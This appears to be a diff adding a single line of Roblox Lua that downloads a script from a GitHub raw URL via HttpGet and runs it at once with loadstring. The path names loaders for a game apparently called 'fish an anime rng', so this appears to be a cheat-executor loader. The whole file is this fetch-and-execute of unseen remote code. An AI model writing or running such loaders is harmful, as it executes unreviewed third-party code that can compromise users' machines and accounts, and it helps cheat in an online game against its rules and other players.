@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/fish-an-anime-rng-spam3-uxpw9jf4ifqhip.lua"))()
